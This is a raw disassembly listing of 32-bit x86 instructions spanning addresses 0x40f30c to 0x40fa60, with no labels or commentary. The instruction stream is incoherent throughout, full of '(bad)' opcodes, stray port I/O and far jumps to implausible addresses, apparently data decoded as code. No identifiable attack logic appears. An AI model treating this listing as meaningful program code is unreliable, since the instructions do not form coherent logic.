  40f30c:	ror    BYTE PTR [ebx-0x7bc74d6],1
  40f312:	adc    eax,DWORD PTR [edx]
  40f314:	mov    dl,dl
  40f316:	jo     0x40f356
  40f318:	(bad)  
  40f319:	call   FWORD PTR [eax-0x19]
  40f31c:	jae    0x40f31a
  40f31e:	ret    0xe812
  40f321:	sbb    edx,DWORD PTR [ecx+0x12]
  40f324:	add    BYTE PTR [ebx-0x2f72e6],cl
  40f32a:	int    0xe2
  40f32c:	data16 add al,0x59
  40f32f:	adc    al,BYTE PTR [eax]
  40f331:	call   0x40fdf8
  40f336:	push   ebx
  40f337:	shl    BYTE PTR [edx+0xf],cl
  40f33a:	mov    ds:0x63646703,eax
  40f33f:	push   ecx
  40f340:	(bad)  
  40f341:	inc    BYTE PTR [eax]
  40f343:	add    BYTE PTR [ebp-0x18],bh
  40f346:	out    0x31,al
  40f348:	adc    BYTE PTR [edx],dl
  40f34a:	add    BYTE PTR [ebx+0x69fe2baa],cl
  40f350:	sbb    BYTE PTR [eax+eax*1],ch
  40f353:	push   0x8
  40f355:	sub    al,0x1
  40f357:	push   0xc0001208
  40f35c:	xchg   edi,eax
  40f35d:	dec    esi
  40f35e:	out    dx,al
  40f35f:	call   0x3f3408
  40f364:	push   ecx
  40f365:	jle    0x40f359
  40f367:	inc    eax
  40f368:	rcl    ecx,cl
  40f36a:	jae    0x40f3b0
  40f36c:	mov    bh,0x4e
  40f36e:	cli    
  40f36f:	(bad)  
  40f370:	mov    ebp,0xcfffe6e1
  40f375:	adc    DWORD PTR [eax],eax
  40f377:	push   0x24
  40f379:	sub    bh,dh
  40f37b:	dec    BYTE PTR [ebp-0x5e8c191f]
  40f381:	adc    DWORD PTR [eax],eax
  40f383:	or     esi,DWORD PTR [ecx]
  40f385:	jmp    0x40f355
  40f387:	or     esi,ecx
  40f389:	push   edx
  40f38a:	fimul  WORD PTR [edx-0x10]
  40f38d:	sub    dh,BYTE PTR [edx+0x23692e7]
  40f393:	add    BYTE PTR [ebx],cl
  40f395:	sub    ebp,eax
  40f397:	dec    DWORD PTR [eax]
  40f399:	sub    eax,ebp
  40f39b:	(bad)  
  40f39c:	fsubr  DWORD PTR [ecx]
  40f39e:	jmp    0xe4fe:0x422b66ff
  40f3a5:	sbb    ch,BYTE PTR [ebx-0x6b]
  40f3a8:	add    BYTE PTR [eax],al
  40f3aa:	sub    eax,DWORD PTR cs:[edx]
  40f3ad:	mov    esp,esi
  40f3af:	shl    DWORD PTR ds:[ebx-0x26],0xa2
  40f3b4:	out    0x4a,al
  40f3b6:	lock sub ch,BYTE PTR [edx-0x63]
  40f3ba:	sub    eax,DWORD PTR cs:[edx]
  40f3bd:	push   eax
  40f3be:	cdq    
  40f3bf:	out    0xbe,eax
  40f3c1:	inc    eax
  40f3c2:	xor    DWORD PTR [esi-0x28],ebx
  40f3c5:	repz or DWORD PTR [ebp+0x14],esi
  40f3c9:	call   DWORD PTR [esi]
  40f3cb:	sti    
  40f3cc:	push   edx
  40f3cd:	je     0x40f3d4
  40f3cf:	arpl   si,cx
  40f3d1:	push   es
  40f3d2:	xor    DWORD PTR [ebx],ebp
  40f3d4:	stos   BYTE PTR es:[edi],al
  40f3d5:	or     dh,cl
  40f3d7:	inc    DWORD PTR ds:0xd86e72eb
  40f3dd:	sti    
  40f3de:	pop    ecx
  40f3df:	fistp  QWORD PTR [esi-0x2761cec0]
  40f3e5:	test   ecx,0xd6fffbde
  40f3eb:	test   eax,0x85590b47
  40f3f0:	mov    esi,0x94a33140
  40f3f5:	push   es
  40f3f6:	xor    DWORD PTR [ebx],ebp
  40f3f8:	std    
  40f3f9:	mov    edi,0xbfda493d
  40f3fe:	cli    
  40f3ff:	adc    ebp,DWORD PTR [eax-0x6fd3fefd]
  40f405:	or     esi,DWORD PTR [ecx]
  40f407:	adc    al,0xe2
  40f409:	inc    ebx
  40f40a:	and    ah,BYTE PTR [ecx]
  40f40c:	ret    
  40f40d:	add    eax,DWORD PTR [eax]
  40f40f:	add    BYTE PTR [ebx],bl
  40f411:	adc    al,0x46
  40f413:	fnstcw WORD PTR [esi+0x3c]
  40f416:	mov    bl,0x53
  40f418:	push   ss
  40f419:	in     eax,0xff
  40f41b:	les    esi,FWORD PTR [esi-0x56]
  40f41e:	call   0x9b7d7275
  40f423:	dec    edi
  40f424:	dec    esi
  40f425:	add    dl,bh
  40f427:	push   edx
  40f428:	pop    edi
  40f429:	cmp    al,0x9b
  40f42b:	push   ebx
  40f42c:	dec    esi
  40f42d:	jmp    0x4b7b:0x3c4f52d6
  40f434:	dec    esi
  40f435:	repnz mov dh,0x52
  40f438:	aas    
  40f439:	dec    edx
  40f43a:	sub    DWORD PTR [ebx+0x664babe3],edi
  40f440:	outs   dx,BYTE PTR ds:[esi]
  40f441:	adc    al,0xe1
  40f443:	aad    0x31
  40f445:	push   edi
  40f446:	fisttp QWORD PTR [esi+0x3e91431]
  40f44c:	(bad)  
  40f44d:	inc    eax
  40f44e:	and    ebp,eax
  40f450:	push   cs
  40f451:	scas   al,BYTE PTR es:[edi]
  40f452:	out    0xba,eax
  40f454:	push   cs
  40f455:	xchg   BYTE PTR [ebx+edx*2],ah
  40f458:	push   edi
  40f45a:	nop
  40f45b:	dec    edi
  40f45c:	inc    ebx
  40f45d:	push   esp
  40f45e:	outs   dx,DWORD PTR ds:[esi]
  40f45f:	push   edx
  40f460:	out    dx,eax
  40f461:	cmp    esp,DWORD PTR [ebp-0x1a036bab]
  40f467:	fcom   st(6)
  40f469:	(bad)
  40f46d:	push   edi
  40f46e:	xor    edi,DWORD PTR [edi-0x26]
  40f471:	xchg   edi,eax
  40f472:	lods   al,BYTE PTR ds:[esi]
  40f473:	push   ebx
  40f474:	add    BYTE PTR [eax],al
  40f476:	arpl   WORD PTR [ebx+edx*4+0x13fe65],bp
  40f47d:	jno    0x40f45b
  40f47f:	adc    al,0xc3
  40f481:	outs   dx,BYTE PTR ds:[esi]
  40f482:	mov    bh,0xf8
  40f484:	in     eax,0x17
  40f486:	ins    BYTE PTR es:[edi],dx
  40f487:	cmp    edi,esi
  40f489:	aad    0xa4
  40f48b:	xchg   esi,eax
  40f48c:	cmp    al,0x47
  40f48e:	push   eax
  40f48f:	aad    0xff
  40f491:	call   0x4c400fc
  40f496:	fucomip st,st(0)
  40f498:	inc    eax
  40f499:	jmp    0x245b5d0
  40f49e:	in     eax,dx
  40f49f:	(bad)  
  40f4a1:	sub    cl,BYTE PTR [edi+0x5f]
  40f4a4:	out    0xcd,eax
  40f4a6:	cmp    edx,DWORD PTR [eax+eax*1]
  40f4a9:	ins    BYTE PTR es:[edi],dx
  40f4aa:	cdq    
  40f4ab:	aas    
  40f4ac:	push   ecx
  40f4ad:	sbb    DWORD PTR [edx-0x35],0xfffffffe
  40f4b1:	hlt    
  40f4b2:	fsubr  st,st(0)
  40f4b4:	inc    eax
  40f4b5:	jmp    0x654f7001
  40f4ba:	ret    0xfe3a
  40f4bd:	jmp    0xea38c4ad
  40f4c2:	xor    dl,BYTE PTR [eax+eax*1]
  40f4c5:	je     0x40f4b5
  40f4c7:	inc    edx
  40f4c8:	dec    edi
  40f4c9:	push   ebx
  40f4ca:	xor    eax,0x3242ffae
  40f4cf:	cmp    esi,DWORD PTR [ebp+ecx*8+0x60]
  40f4d3:	and    dh,ch
  40f4d5:	pop    ss
  40f4d6:	repnz cmp cl,BYTE PTR [ecx]
  40f4d9:	test   eax,0xace60000
  40f4de:	out    0x39,eax
  40f4e0:	sub    BYTE PTR [eax+eax*1],dl
  40f4e3:	push   0x7d
  40f4e5:	mov    ebp,0xb7ac0974
  40f4ea:	imul   ecx
  40f4ec:	push   es
  40f4ed:	(bad)  
  40f4ef:	sbb    al,0x65
  40f4f1:	xor    edi,DWORD PTR [edi-0x2c]
  40f4f4:	popa   
  40f4f5:	cmp    cl,BYTE PTR [eax-0x7423eb00]
  40f4fb:	inc    ebp
  40f4fc:	mov    al,0x7f
  40f4fe:	std    
  40f4ff:	jne    0x40f541
  40f501:	in     eax,0x73
  40f503:	hlt    
  40f504:	xor    dl,BYTE PTR [edi]
  40f506:	push   DWORD PTR [ebp+0xc]
  40f509:	in     eax,0x13
  40f50b:	out    dx,al
  40f50c:	cs push edi
  40f50e:	dec    BYTE PTR [edx]
  40f510:	dec    eax
  40f511:	pop    esp
  40f512:	sub    al,0x8b
  40f514:	aad    0xe2
  40f516:	mov    DWORD PTR [eax],edx
  40f518:	std    
  40f519:	push   edx
  40f51a:	out    dx,al
  40f51b:	push   eax
  40f51c:	call   0xfe57:0x2ef213e3
  40f523:	or     bl,BYTE PTR [eax]
  40f525:	pop    esp
  40f526:	sbb    BYTE PTR [eax+0x37],ch
  40f529:	jns    0x40f56a
  40f52b:	add    BYTE PTR [edi],bh
  40f52d:	arpl   si,bp
  40f52f:	call   0x410366
  40f534:	push   ebx
  40f535:	(bad)  
  40f536:	jae    0x40f539
  40f538:	fwait
  40f539:	jecxz  0x40f5ae
  40f53b:	lock and BYTE PTR [ebx],ah
  40f53e:	push   es
  40f53f:	add    BYTE PTR [eax],al
  40f541:	add    BYTE PTR [eax-0x1d],cl
  40f544:	jae    0x40f53a
  40f546:	xor    BYTE PTR [ebx],bh
  40f548:	xor    edi,edi
  40f54a:	pmulhw mm6,QWORD PTR [ebx-0x4]
  40f54e:	add    BYTE PTR ds:0xb9080006,cl
  40f554:	rcr    DWORD PTR [ebx-0x2f],0xd0
  40f558:	push   ebx
  40f559:	mov    ebx,esp
  40f55b:	xchg   esi,eax
  40f55c:	ret    0xbec0
  40f55f:	in     al,0xfd
  40f561:	push   ebx
  40f562:	jo     0x40f4ee
  40f564:	loope  0x40f5a6
  40f566:	fmul   st,st(5)
  40f568:	jo     0x40f56b
  40f56a:	fwait
  40f56b:	in     al,0x81
  40f56d:	cmp    eax,0x411ee7
  40f572:	xor    DWORD PTR [ebx],ebp
  40f574:	(bad)  
  40f575:	sbb    dh,BYTE PTR [edx+0x7028eb48]
  40f57b:	sub    eax,DWORD PTR [edx]
  40f57d:	je     0x40f5a2
  40f57f:	scas   al,BYTE PTR es:[edi]
  40f580:	or     eax,0x3ec07e6
  40f585:	add    BYTE PTR ds:0x9b3c8334,ah
  40f58b:	and    ebx,eax
  40f58d:	call   FWORD PTR [esi+0x712b0560]
  40f593:	xchg   BYTE PTR [ecx],bh
  40f595:	ret    0x65a
  40f598:	push   eax
  40f599:	adc    al,0x1e
  40f59b:	and    al,0xc3
  40f59d:	jmp    FWORD PTR [ecx-0x5339a990]
  40f5a3:	out    dx,eax
  40f5a4:	push   eax
  40f5a5:	inc    BYTE PTR [eax]
  40f5a7:	add    BYTE PTR [esi+0x13],ch
  40f5aa:	add    eax,DWORD PTR [eax]
  40f5ac:	xor    DWORD PTR [ebp+0x23336a02],esp
  40f5b2:	call   0x4ef7:0x832b3105
  40f5b9:	pop    edx
  40f5ba:	xchg   BYTE PTR ds:0x89022b30,bl
  40f5c0:	mov    ah,0x3
  40f5c2:	push   ecx
  40f5c3:	(bad)  
  40f5c4:	ss mov al,0x85
  40f5c7:	retf   
  40f5c8:	das    
  40f5c9:	sub    cl,BYTE PTR [esi+0x4f]
  40f5cc:	es cwde 
  40f5ce:	cmp    edi,ebp
  40f5d0:	push   ds
  40f5d1:	pop    edx
  40f5d2:	pop    ebx
  40f5d3:	lea    ebp,[edi]
  40f5d5:	sub    eax,DWORD PTR [edx]
  40f5d7:	or     esi,ecx
  40f5d9:	pop    ecx
  40f5da:	xchg   dl,dh
  40f5dc:	xor    DWORD PTR [ebx],ebp
  40f5de:	add    ch,BYTE PTR [eax-0x25]
  40f5e1:	add    eax,0xa7a5ffc5
  40f5e6:	push   ebx
  40f5e7:	std    
  40f5e8:	out    dx,al
  40f5e9:	imul   esi,DWORD PTR [ebx-0x11ebbf19],0xa90d3103
  40f5f3:	push   DWORD PTR [edx+0x3103e854]
  40f5f9:	push   ecx
  40f5fa:	arpl   WORD PTR [eax-0x3c],cx
  40f5fd:	cmp    BYTE PTR [ebp-0x16ebcefc],al
  40f603:	sub    BYTE PTR [ebp-0x50b089b1],0xe3
  40f60a:	ins    DWORD PTR es:[edi],dx
  40f60b:	cdq    
  40f60c:	add    BYTE PTR [eax],al
  40f60e:	cmp    BYTE PTR [ecx],0x65
  40f611:	dec    edi
  40f612:	lahf   
  40f613:	push   ds
  40f614:	add    bl,BYTE PTR ds:0x796213f0
  40f61a:	jb     0x40f655
  40f61c:	dec    ebp
  40f61d:	dec    edi
  40f61e:	cmp    edx,DWORD PTR [ebp+esi*8-0x79]
  40f622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f623:	adc    ebp,ecx
  40f625:	add    edi,DWORD PTR [edx]
  40f627:	fistp  QWORD PTR [edi+edi*8]
  40f62a:	mov    ch,0x88
  40f62c:	call   0x5b7a2734
  40f631:	cmp    BYTE PTR [eax+edi*1+0x1d],bl
  40f635:	ficom  DWORD PTR [esi-0x50]
  40f638:	call   0x1572740
  40f63d:	and    DWORD PTR [edi],ebp
  40f63f:	adc    al,0xe9
  40f641:	cli    
  40f642:	jle    0x40f603
  40f644:	jg     0x40f6c2
  40f646:	in     eax,dx
  40f647:	cmp    esp,DWORD PTR [ebx-0x37]
  40f64a:	sub    ah,ch
  40f64c:	sbb    BYTE PTR [edx+0x31],0x12
  40f650:	jmp    0xdd7d9ba3
  40f655:	clc    
  40f656:	or     al,0xe7
  40f658:	daa    
  40f659:	add    al,0x3a
  40f65b:	push   esp
  40f65c:	push   esp
  40f65d:	lods   al,BYTE PTR ds:[esi]
  40f65e:	pop    es
  40f65f:	ret    0x4ec4
  40f662:	and    eax,0xf6c50e2a
  40f667:	or     al,BYTE PTR [eax]
  40f669:	test   eax,0xa642fd06
  40f66e:	mov    ecx,0xa6fd77
  40f673:	add    BYTE PTR [edi+0x37],ch
  40f676:	(bad)  
  40f677:	jmp    0xa9c57fae
  40f67c:	jl     0x40f6b4
  40f67e:	(bad)  
  40f67f:	cmp    ebp,esp
  40f681:	idiv   bh
  40f683:	cmc    
  40f684:	xor    ch,BYTE PTR [esi+ebx*2]
  40f687:	out    0x32,eax
  40f689:	adc    al,0xb
  40f68b:	test   eax,0x2c832089
  40f690:	repnz cmp dh,bh
  40f693:	data16 xor al,al
  40f696:	or     ebx,DWORD PTR [esi-0x47]
  40f699:	ja     0x40f698
  40f69b:	push   esi
  40f69c:	inc    DWORD PTR [ebp-0x2ada52fc]
  40f6a2:	call   DWORD PTR [ecx+0x23]
  40f6a5:	sub    ebx,DWORD PTR [ecx]
  40f6a7:	ds pop ecx
  40f6a9:	cmp    esp,edi
  40f6ab:	jge    0x40f6e3
  40f6ad:	adc    al,0x0
  40f6af:	mov    DWORD PTR cs:[edi],edi
  40f6b2:	out    0x55,eax
  40f6b4:	ss adc al,0x0
  40f6b7:	adc    bl,BYTE PTR [edx+0x36]
  40f6ba:	je     0x40f6cd
  40f6bc:	jmp    0x8489:0x32e90374
  40f6c3:	xor    eax,0x99fe35ec
  40f6c8:	out    0x7f,eax
  40f6ca:	(bad)  
  40f6cb:	idiv   DWORD PTR [esi+esi*1-0x19]
  40f6cf:	inc    ebp
  40f6d0:	cmp    DWORD PTR [eax+eax*1],edx
  40f6d3:	shl    BYTE PTR [esi],1
  40f6d5:	aaa    
  40f6d6:	(bad)  
  40f6d7:	fiadd  WORD PTR [eax]
  40f6d9:	add    BYTE PTR [eax+eax*4-0x39],ah
  40f6dd:	xlat   BYTE PTR ds:[ebx]
  40f6de:	jl     0x40f716
  40f6e0:	out    0x69,eax
  40f6e2:	cmp    DWORD PTR [eax+eax*1],edx
  40f6e5:	add    BYTE PTR [ebx-0x3436a62b],al
  40f6eb:	jle    0x40f676
  40f6ed:	in     al,dx
  40f6ee:	pop    ebx
  40f6ef:	int3   
  40f6f0:	ficom  WORD PTR [ebx+0x70]
  40f6f3:	push   es
  40f6f4:	in     eax,0x40
  40f6f6:	enter  0x70ca,0x1
  40f6fa:	mov    ecx,eax
  40f6fc:	cmp    DWORD PTR ds:0x41166e,0x83075ed8
  40f706:	cmc    
  40f707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f708:	sub    al,0x41
  40f70a:	enter  0x7512,0x5
  40f70e:	jae    0x40f6e2
  40f710:	pop    ecx
  40f711:	leave  
  40f712:	fcmovnbe st,st(0)
  40f714:	inc    ebx
  40f715:	cld    
  40f716:	mov    BYTE PTR [edx],dl
  40f718:	add    BYTE PTR [eax],al
  40f71a:	dec    edi
  40f71b:	dec    edi
  40f71c:	test   BYTE PTR [eax],0x98
  40f71f:	adc    al,BYTE PTR [eax]
  40f721:	(bad)  
  40f722:	int    0xd6
  40f724:	(bad)  
  40f725:	dec    DWORD PTR [eax+0x3c45c712]
  40f72b:	adc    BYTE PTR [eax],al
  40f72d:	add    BYTE PTR [eax-0x31],bl
  40f730:	inc    ebx
  40f731:	lock pop eax
  40f733:	adc    al,BYTE PTR [eax]
  40f735:	add    ch,ah
  40f737:	dec    esi
  40f738:	out    dx,al
  40f739:	push   eax
  40f73a:	lds    ecx,FWORD PTR [esi-0xe]
  40f73d:	push   eax
  40f73e:	add    BYTE PTR [eax],al
  40f740:	aad    0x4e
  40f742:	jmp    0x3445:0x8bc7b250
  40f749:	sub    BYTE PTR [eax+0x2],0xa2
  40f74d:	adc    ebp,DWORD PTR [edx+0x0]
  40f750:	daa    
  40f751:	aas    
  40f752:	mov    ah,0x2e
  40f754:	fst    DWORD PTR [ecx]
  40f756:	mov    DWORD PTR [ebp+0x0],eax
  40f759:	xchg   ebp,eax
  40f75a:	jnp    0x40f744
  40f75c:	or     BYTE PTR [esi+0x7],bl
  40f75f:	xor    DWORD PTR [ecx],0x31e95be0
  40f765:	sub    eax,DWORD PTR [edx]
  40f767:	jne    0x40f6ee
  40f769:	dec    esi
  40f76a:	aad    0xfb
  40f76c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f76d:	lock dec ebx
  40f76f:	sub    BYTE PTR [ebx+eax*4+0x2],0x74
  40f774:	mov    esi,DWORD PTR [edx+0x2ecaf7ad]
  40f77a:	dec    ebx
  40f77b:	jb     0x40f7c6
  40f77d:	mov    ds:0x9ece41d5,eax
  40f782:	jns    0x40f7c8
  40f784:	rol    DWORD PTR [esi-0x16b517f1],1
  40f78a:	dec    esp
  40f78b:	(bad)  
  40f78c:	sub    ch,BYTE PTR [ebx-0x2a]
  40f78f:	and    bh,BYTE PTR [eax+0x356967e8]
  40f795:	xchg   ebx,eax
  40f796:	pop    esp
  40f797:	xor    DWORD PTR [esi-0x6e8bb452],ebx
  40f79d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f79e:	ret    0x8e07
  40f7a1:	pop    eax
  40f7a2:	data16 mov es,WORD PTR [eax]
  40f7a5:	add    cl,dh
  40f7a7:	cs dec ebx
  40f7a9:	xor    al,0x4f
  40f7ab:	add    cl,0xff
  40f7ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7af:	sub    ebx,DWORD PTR [edi+0x26bfa2d]
  40f7b5:	xor    DWORD PTR [edx+0x7f],0x4b
  40f7b9:	dec    esp
  40f7ba:	dec    ebp
  40f7bb:	stos   BYTE PTR es:[edi],al
  40f7bc:	int    0xeb
  40f7be:	xor    DWORD PTR [eax+0x1ec4fe87],esp
  40f7c4:	dec    esp
  40f7c5:	adc    al,0x83
  40f7c7:	jne    0x40f78a
  40f7c9:	push   DWORD PTR [edi+0x68]
  40f7cc:	dec    esi
  40f7cd:	push   DWORD PTR [esi]
  40f7cf:	sub    eax,DWORD PTR [edx]
  40f7d1:	sub    DWORD PTR [ebx+edx*1+0x2b26ff59],0x140804d5
  40f7dc:	inc    ebp
  40f7dd:	dec    ebx
  40f7de:	pop    ss
  40f7df:	xor    eax,0x140ac969
  40f7e4:	pop    ebp
  40f7e5:	std    
  40f7e6:	pop    es
  40f7e7:	mov    edi,0x82254bcc
  40f7ec:	push   ss
  40f7ed:	(bad)
  40f7f0:	out    0x3,eax
  40f7f2:	xor    DWORD PTR [edx+edx*1],edx
  40f7f5:	cmp    eax,0x5861def3
  40f7fa:	mov    bl,0x4f
  40f7fc:	mov    esp,0x23ac7fb7
  40f801:	bound  ecx,QWORD PTR [esi]
  40f803:	adc    al,0x91
  40f805:	(bad)  
  40f806:	xor    DWORD PTR [ecx-0x73],edx
  40f809:	xchg   DWORD PTR [eax],eax
  40f80b:	add    ch,bh
  40f80d:	sub    esi,edx
  40f80f:	les    esi,FWORD PTR [esi-0x4c030bcc]
  40f815:	idiv   BYTE PTR [esi+0x1a]
  40f818:	lock adc ebp,ecx
  40f81b:	shl    BYTE PTR [ecx+ebp*8],1
  40f81e:	sub    BYTE PTR [ebx+0x7f294afb],ch
  40f824:	sub    eax,0x86c4a1e6
  40f829:	sub    esi,DWORD PTR [edi+0x5]
  40f82c:	xor    DWORD PTR [ecx+edx*2],edx
  40f82f:	and    BYTE PTR [ebp+0x34],dh
  40f832:	cmp    eax,0xa2022d87
  40f837:	les    esp,FWORD PTR [esi+0x34]
  40f83a:	mov    ah,0xf2
  40f83c:	pop    edi
  40f83d:	shr    ah,0x4a
  40f840:	sbb    eax,0x4ec4b202
  40f845:	sub    al,0x46
  40f847:	pop    es
  40f848:	xor    DWORD PTR [edx+eiz*8],edx
  40f84b:	inc    ebx
  40f84c:	lds    ecx,FWORD PTR [esi]
  40f84e:	adc    dh,bl
  40f850:	xor    DWORD PTR [ecx+ebp*8],edx
  40f853:	inc    edx
  40f854:	jne    0x40f886
  40f856:	(bad)  
  40f857:	call   0x5c410c8e
  40f85c:	lock das 
  40f85e:	dec    edi
  40f85f:	push   ebx
  40f860:	sub    eax,0xe7de01be
  40f865:	pop    ss
  40f866:	push   0xffffffe9
  40f868:	jnp    0x40f810
  40f86a:	add    ecx,esi
  40f86c:	add    DWORD PTR [edx],ebp
  40f86e:	sub    eax,0x2d000028
  40f873:	pop    ds
  40f874:	shl    BYTE PTR ds:0xe9883d30,0x32
  40f87b:	adc    al,0xff
  40f87d:	cmp    dh,BYTE PTR [ecx]
  40f87f:	cmp    al,0x59
  40f881:	sub    BYTE PTR [edx+0x32],ch
  40f884:	mov    BYTE PTR [edi*2+0x6aed7232],ah
  40f88b:	inc    ecx
  40f88c:	add    ecx,ebp
  40f88e:	xor    al,ah
  40f890:	(bad)  
  40f891:	cld    
  40f892:	push   0xffffffe3
  40f894:	(bad)  
  40f895:	cli    
  40f896:	scas   al,BYTE PTR es:[edi]
  40f897:	mov    ebx,0x1432e7ff
  40f89c:	push   0xfe339ee9
  40f8a1:	push   ecx
  40f8a2:	adc    DWORD PTR [esi],edx
  40f8a4:	add    cl,ch
  40f8a6:	(bad)  
  40f8a7:	jae    0x40f91c
  40f8a9:	add    dh,dl
  40f8ab:	xlat   BYTE PTR ds:[ebx]
  40f8ac:	sti    
  40f8ad:	jmp    0x74410ce4
  40f8b2:	jno    0x40f8e3
  40f8b4:	dec    edi
  40f8b5:	shl    DWORD PTR [edx],cl
  40f8b7:	mov    esi,0x2b813601
  40f8bc:	imul   ebp,ecx,0x2603a5eb
  40f8c2:	popa   
  40f8c3:	sub    DWORD PTR ds:0xc01f32a8,ebp
  40f8c9:	popf   
  40f8ca:	inc    esp
  40f8cb:	xor    dh,BYTE PTR [ecx+edx*1-0x26]
  40f8cf:	js     0x40f901
  40f8d1:	add    BYTE PTR [edi],ch
  40f8d3:	fsubp  st(1),st
  40f8d5:	xor    BYTE PTR [eax],al
  40f8d7:	add    BYTE PTR [edi],ch
  40f8d9:	arpl   si,si
  40f8db:	call   0x40015c
  40f8e0:	dec    edi
  40f8e1:	pop    ss
  40f8e2:	and    BYTE PTR [ecx+0x8],al
  40f8e5:	aam    0x43
  40f8e7:	cld    
  40f8e8:	sbb    BYTE PTR [edi],dl
  40f8ea:	add    BYTE PTR [eax],al
  40f8ec:	lea    esi,[ebx-0x6]
  40f8ef:	push   eax
  40f8f0:	jb     0x40f90a
  40f8f2:	push   0x2
  40f8f4:	pop    ss
  40f8f5:	push   edx
  40f8f6:	(bad)  
  40f8f7:	(bad)  
  40f8f8:	sub    edx,DWORD PTR [edi+edi*8]
  40f8fb:	adc    eax,0x410da6
  40f900:	rcl    esi,cl
  40f902:	or     eax,0x188184
  40f907:	add    BYTE PTR [edi-0x27df298e],dl
  40f90d:	push   ss
  40f90e:	add    bh,al
  40f910:	adc    eax,0xc8fffffc
  40f915:	push   ss
  40f916:	push   DWORD PTR [ebx-0x6c]
  40f919:	stos   DWORD PTR es:[edi],eax
  40f91a:	inc    ebx
  40f91b:	loopne 0x40f93c
  40f91d:	dec    ecx
  40f91e:	push   es
  40f91f:	(bad)  
  40f920:	push   ebp
  40f921:	mov    ah,0xc5
  40f923:	inc    ebp
  40f924:	add    BYTE PTR [eax],bl
  40f926:	add    BYTE PTR [eax],al
  40f928:	cwde   
  40f929:	rol    DWORD PTR [ebx-0x14],cl
  40f92c:	cwde   
  40f92d:	push   ss
  40f92e:	add    BYTE PTR [eax],al
  40f930:	push   edi
  40f931:	jae    0x40f921
  40f933:	add    BYTE PTR [eax-0x6a38ffea],cl
  40f939:	loop   0x40f939
  40f93b:	inc    DWORD PTR [eax]
  40f93d:	add    BYTE PTR [eax+0x16],bl
  40f940:	lea    eax,[ebp+0x40]
  40f943:	push   0xd00c75fd
  40f948:	sub    al,0x4
  40f94a:	pop    eax
  40f94b:	push   ss
  40f94c:	or     eax,eax
  40f94e:	xor    DWORD PTR [ecx+0x8bc82ea],edx
  40f954:	add    al,0x74
  40f956:	sub    BYTE PTR [edx],bl
  40f958:	iret   
  40f959:	repz mov esi,0x7028a638
  40f95f:	cmp    edi,DWORD PTR [edi]
  40f961:	inc    esp
  40f962:	add    eax,0x3100023d
  40f967:	inc    esi
  40f968:	inc    esi
  40f96a:	je     0x40f9d3
  40f96c:	add    al,BYTE PTR [eax]
  40f96e:	xor    DWORD PTR [ebx],edi
  40f970:	inc    edi
  40f971:	je     0x40f970
  40f973:	(bad)  
  40f974:	in     eax,dx
  40f975:	jmp    0xb44f5c1
  40f97a:	icebp  
  40f97b:	out    0xe9,eax
  40f97d:	out    0xca,eax
  40f97f:	jno    0x40f9c8
  40f981:	(bad)  
  40f982:	mov    dl,0x40
  40f984:	fs sub eax,0x74023b70
  40f98a:	aaa    
  40f98b:	xchg   edx,eax
  40f98c:	in     eax,dx
  40f98d:	loope  0x40f9a6
  40f98f:	cld    
  40f990:	add    eax,edi
  40f992:	xor    al,0xff
  40f994:	sbb    al,BYTE PTR [ecx+0x31]
  40f997:	cmp    al,0x2
  40f999:	add    BYTE PTR [ecx+0x31d3c5be],dh
  40f99f:	das    
  40f9a0:	sti    
  40f9a1:	inc    BYTE PTR [eax]
  40f9a3:	add    BYTE PTR [edi+eiz*4],ah
  40f9a6:	inc    edi
  40f9a7:	je     0x40f93e
  40f9a9:	ret    
  40f9aa:	sub    eax,0x473b3102
  40f9af:	je     0x40f936
  40f9b1:	rol    DWORD PTR [ebx+0x0],cl
  40f9b4:	xor    DWORD PTR [ebx],edi
  40f9b6:	inc    esi
  40f9b7:	xor    dh,BYTE PTR [ecx-0x6c]
  40f9ba:	inc    edi
  40f9bb:	(bad)  
  40f9bc:	outs   dx,BYTE PTR ds:[esi]
  40f9bd:	repnz push esp
  40f9bf:	lods   eax,DWORD PTR ds:[esi]
  40f9c0:	sub    DWORD PTR [edx-0x9],eax
  40f9c3:	test   BYTE PTR [ebx],dl
  40f9c5:	add    cl,BYTE PTR [eax-0x2]
  40f9c8:	stos   BYTE PTR es:[edi],al
  40f9c9:	adc    al,0x2
  40f9cb:	std    
  40f9cc:	imul   esp,DWORD PTR [ecx],0x64
  40f9cf:	loopne 0x40fa15
  40f9d1:	xor    DWORD PTR ds:0xe914318b,edx
  40f9d7:	add    edx,esi
  40f9d9:	int3   
  40f9da:	das    
  40f9db:	inc    esp
  40f9dc:	test   DWORD PTR [ebp+0x2ff2840c],ebx
  40f9e2:	sub    ch,0x16
  40f9e5:	aam    0xe8
  40f9e7:	dec    ebx
  40f9e8:	mov    al,ds:0x9847aa13
  40f9ed:	adc    al,0xd1
  40f9ef:	xor    eax,0x5be91430
  40f9f4:	cld    
  40f9f5:	in     eax,dx
  40f9f6:	int    0x47
  40f9f8:	push   cs
  40f9f9:	xchg   DWORD PTR [ecx-0x7d4410b9],edi
  40f9ff:	push   ss
  40fa00:	jo     0x40fa16
  40fa02:	inc    ecx
  40fa03:	push   edx
  40fa04:	or     dl,bl
  40fa06:	call   0x2540fa66
  40fa0b:	in     eax,dx
  40fa0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa0d:	inc    edi
  40fa0e:	push   esi
  40fa0f:	push   ss
  40fa10:	into   
  40fa11:	(bad)  
  40fa12:	(bad)  
  40fa13:	mov    eax,0x14701629
  40fa18:	add    DWORD PTR [esi-0x8],0xecdc8530
  40fa1f:	add    DWORD PTR [eax],ebp
  40fa21:	add    al,0x19
  40fa23:	and    ah,al
  40fa25:	les    ebx,FWORD PTR [esi-0x69f582c8]
  40fa2b:	xor    al,dl
  40fa2d:	lds    ebx,FWORD PTR [ecx-0x2d]
  40fa30:	call   0xa83be110
  40fa35:	add    ecx,DWORD PTR [ecx+0x77471233]
  40fa3b:	mov    ebx,0x13f0167a
  40fa40:	sar    DWORD PTR [esi],1
  40fa42:	sbb    dl,bl
  40fa44:	(bad)  
  40fa45:	call   0x2e7a3e44
  40fa4a:	out    dx,al
  40fa4b:	mov    eax,0x3075d016
  40fa50:	ss and ax,0xffd3
  40fa55:	add    bl,dh
  40fa57:	jmp    0x6fa:0x19d50efe
  40fa5e:	jbe    0x40fa97
  40fa60:	xor    al,0x3
